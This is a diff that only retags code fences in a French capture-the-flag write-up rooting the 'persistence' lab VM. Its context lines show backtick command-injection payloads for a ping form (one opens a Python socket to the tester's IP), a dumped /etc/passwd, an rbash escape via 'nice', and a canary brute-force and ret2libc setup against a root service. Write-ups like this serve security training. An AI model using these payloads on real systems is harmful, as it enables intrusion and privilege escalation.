@@ -43,7 +43,7 @@ Il y a fort à parier qu'il y ait soit un filtre assez complexe sur le champ de 
 
 Mon adresse IP étant 192.168.1.3 (celle de la VM 192.168.1.21) j'ai utilisé des backticks avec un test conditionnel pour tester la présence de fichiers sur le système. Ainsi si je rentre le texte suivi dans le champ du formulaire :  
 
-```plain
+```
 -c 1 `[ -f /etc/passwd ] && echo 192.168.1.3`
 ```
 
@@ -51,13 +51,13 @@ j'obtiens bien un ICMP echo reply en retour.
 
 En revanche avec  
 
-```plain
+```
 -c 1 `[ -f /usr/bin/cat ] && echo 192.168.1.3`
 ```
 
 nada ! Alors qu'avec  
 
-```plain
+```
 -c 1 `[ -f /bin/bash ] && echo 192.168.1.3`
 ```
 
@@ -133,7 +133,7 @@ while True:
 
 J'ai ainsi récupérer la liste de fichiers suivants pour /etc :  
 
-```plain
+```
 /etc/passwd
 /etc/shadow
 /etc/group
@@ -144,7 +144,7 @@ J'ai ainsi récupérer la liste de fichiers suivants pour /etc :
 
 Pour /bin :  
 
-```plain
+```
 /bin/ls
 /bin/touch
 /bin/uname
@@ -158,7 +158,7 @@ Pour /bin :
 
 ce qui est plutôt limité... et pour /usr/bin  
 
-```plain
+```
 /usr/bin/tr
 /usr/bin/id
 /usr/bin/xxd
@@ -170,7 +170,7 @@ On est donc visiblement dans un *chroot*. Notez qu'il serait aussi possible de t
 
 Si on tente d'établir une connexion sortante via *Python* en injectant :  
 
-```plain
+```
 -c 1 `python -c 'import socket;socket.socket().connect(("192.168.1.3",21))';echo 192.168.1.3`
 ```
 
@@ -180,7 +180,7 @@ A tout hasard j'ai essayé via *Python* de scanner les ports de la machine hôte
 
 Le serveur web étant un *nginx* on trouve facilement via une recherche *duckduckgo* quel est le path par défaut. On peut confirmer le chemin du script *debug.php* avec cette commande :  
 
-```plain
+```
 -c 1 `[ -f /usr/share/nginx/html/debug.php ] && echo 192.168.1.3`
 ```
 
@@ -271,7 +271,7 @@ La boucle permet d'itérer jusqu'à 20000 blocks de 16 octets. Normalement c'est
 
 Parmi mes trophés on trouve le */etc/passwd* :  
 
-```plain
+```
 root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
 daemon:x:2:2:daemon:/sbin:/sbin/nologin
@@ -297,7 +297,7 @@ apache:x:48:48:Apache:/var/www/sbin/nologin
 
 Le fichier de configuration principal de *nginx* :  
 
-```plain
+```
 user  nginx;
 worker_processes  1;
 
@@ -332,7 +332,7 @@ http {
 
 et le fichier */etc/nginx/conf.d/default.conf*  
 
-```plain
+```
 # The default server
 #
 server {
@@ -392,7 +392,7 @@ Je ne vous donne pas toutes les lignes que j'ai pu récupérer mais on découvre
 
 Par contre ce qui est intéressant c'est ceci :  
 
-```plain
+```
 /usr/share/nginx/html:
 total 168
 drwxr-xr-x. 2 root root   4096 Aug 16 04:02 .
@@ -429,7 +429,7 @@ Ensuite le binaire setuid root *sysadmin-tool* est accessible via le navigateur 
 
 Un strings permet d'obtenir une idée de ce qu'il fait  
 
-```plain
+```
 /lib/ld-linux.so.2
 __gmon_start__
 libc.so.6
@@ -463,7 +463,7 @@ Prison break
 
 Une fois connecté on a la joie (ou pas) de se retrouver dans un bash restreint (*rbash*) :  
 
-```plain
+```
 $ ssh avida@192.168.1.21
 avida@192.168.1.21's password: 
 Last login: Mon Mar 17 17:13:40 2014 from 10.0.0.210
@@ -523,7 +523,7 @@ Les variables d'environnement *SHELL* et *PATH* sont un lecture seule... Ce sera
 
 Dans le seul path qui nous est laissé (*/home/avida/usr/bin*) on trouve la commande *nice* qui permet de passer des commandes et ainsi de s'échapper du *rbash* :  
 
-```plain
+```
 -rbash-4.1$ nice /usr/bin/sudo -l
 [sudo] password for avida: 
 Sorry, user avida may not run sudo on persistence.
@@ -536,13 +536,13 @@ Shall we play a game ?
 
 Avec notre nouveau shell on remarque dans les processus un programme *wopr* lancé par root :  
 
-```plain
+```
 root      1020  0.0  0.0   2004   412 ?        S    Sep08   0:00 /usr/local/bin/wopr
 ```
 
 Ce programme n'est pas setuid mais qu'importe si on peut l'exploiter :  
 
-```plain
+```
 bash-4.1$ strings /usr/local/bin/wopr
 /lib/ld-linux.so.2
 __gmon_start__
@@ -597,7 +597,7 @@ Il écoute sur le port TCP 3333, affirme qu'il enregistre les requêtes dans *$T
 
 Lors d'une connexion il *fork()*, lit les données puis les passe à *get\_reply* que voici :  
 
-```plain
+```
 [0x080486c0]> pdf@sym.get_reply
 |          ; CODE (CALL) XREF from 0x08048ad1 (fcn.080487de)
 / (fcn) sym.get_reply 106
@@ -650,7 +650,7 @@ Par conséquent on ne peut pas écraser l'adresse de retour sans avoir aussi éc
 
 Ainsi si on envoie 64 caractères *A* sur notre *wopr* en local :  
 
-```plain
+```
 $ ./wopr
 [+] bind complete
 [+] waiting for connections
@@ -688,7 +688,7 @@ ffb6d000-ffb8e000 rw-p 00000000 00:00 0                                  [stack]
 
 Que peut-on dire d'autre ?  
 
-```plain
+```
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   wopr
 ```
@@ -709,7 +709,7 @@ La procédure d'attaque est la suivante : on ne peut pas utiliser la stack en ra
 
 Via gdb on trouve l'adresse de *system* :  
 
-```plain
+```
 (gdb) p system
 $1 = {<text variable, no debug info>} 0x16c210 <system>
 ```
@@ -762,7 +762,7 @@ En local l'exécution est quasi-immédiate. Sur la VM c'est plus lent, peut êtr
 
 On obtient ce résultat :  
 
-```plain
+```
 canary = 77
 canary = 77b7
 canary = 77b717
@@ -823,7 +823,7 @@ s.close()
 
 Une fois exécuté, le processus *wopr* exécute */tmp/log* via *system()* ce qui rend notre binaire *getroot* setuid root et nous ouvre la porte :)  
 
-```plain
+```
 bash-4.1# cat flag.txt
               .d8888b.  .d8888b. 888
              d88P  Y88bd88P  Y88b888
